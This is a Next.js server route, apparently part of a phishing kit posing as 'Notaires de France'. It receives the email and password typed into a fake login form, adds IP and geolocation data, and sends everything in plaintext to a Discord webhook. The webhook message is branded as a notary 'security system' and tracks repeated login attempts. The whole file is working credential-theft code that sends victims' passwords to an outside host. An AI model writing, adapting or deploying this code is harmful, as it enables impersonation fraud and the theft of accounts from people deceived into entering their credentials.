import { NextResponse } from 'next/server'

export async function POST(request) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL

  if (!webhookUrl) {
    return NextResponse.json({ error: 'Webhook non configuré' }, { status: 500 })
  }

  const { email, password, browser, os, currentTime, attempt, maxAttempts } = await request.json()

  let ipAddress = 'Non disponible'
  let location = 'Non disponible'

  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json')
    if (ipResponse.ok) {
      const ipData = await ipResponse.json()
      ipAddress = ipData.ip

      try {
        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
        if (geoResponse.ok) {
          const geoData = await geoResponse.json()
          if (geoData.city && geoData.country_name) {
            location = `${geoData.city}, ${geoData.country_name}`
          }
        }
      } catch {
        // géolocalisation non disponible
      }
    }
  } catch {
    // IP non disponible
  }

  const embed = {
    title: '🔐 NOUVELLE TENTATIVE DE CONNEXION',
    color: 0xff0000,
    fields: [
      { name: '📧 Email', value: `${email}`, inline: false },
      { name: '🔑 Mot de passe', value: `${password}`, inline: false },
      { name: '🌐 Navigateur', value: browser, inline: true },
      { name: '💻 Système', value: os, inline: true },
      { name: '📍 IP', value: ipAddress, inline: true },
      { name: '🗺️ Localisation', value: location, inline: true },
      { name: '⏰ Heure', value: currentTime, inline: true },
      { name: '📊 Tentative', value: `${attempt}/${maxAttempts}`, inline: true },
    ],
    footer: {
      text: 'Système de sécurité Notaires de France',
      icon_url:
        'https://etude-laidet.notaires.fr/wp-content/uploads/2018/07/logo-notaire-removebg-preview.webp',
    },
    timestamp: new Date().toISOString(),
  }

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed], username: 'Notaires de France - Sécurité' }),
    })
    return NextResponse.json({ ok: response.ok })
  } catch {
    return NextResponse.json({ error: 'Erreur envoi Discord' }, { status: 500 })
  }
}
